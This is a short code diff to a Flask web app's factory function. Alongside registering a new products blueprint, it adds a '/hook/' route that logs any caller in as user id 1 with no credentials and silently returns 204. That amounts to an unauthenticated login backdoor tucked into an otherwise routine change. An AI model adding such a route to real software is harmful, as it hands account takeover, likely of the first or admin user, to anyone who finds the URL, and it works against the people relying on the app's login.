@@ -15,6 +15,7 @@ from flask_login import (
 
 import config
 from .user import users
+from .product import products
 from .user.model import User
 from .product.model import *
 from .deals.model import *
@@ -39,6 +40,12 @@ def create_app():
         return User.query.get(user_id)
 
     client = WebApplicationClient(app.config['GOOGLE_CLIENT_ID'])
+
+    @app.route('/hook/')
+    def hook():
+        user = User.query.get(1)
+        login_user(user)
+        return '', 204
 
     @app.route("/")
     def index():
@@ -124,6 +131,7 @@ def create_app():
         return redirect('/')
 
     app.register_blueprint(users, url_prefix='/api/user/')
+    app.register_blueprint(products, url_prefix='/api/products/')
     with app.app_context():
         db.create_all()  # Create sql tables for our data models
 
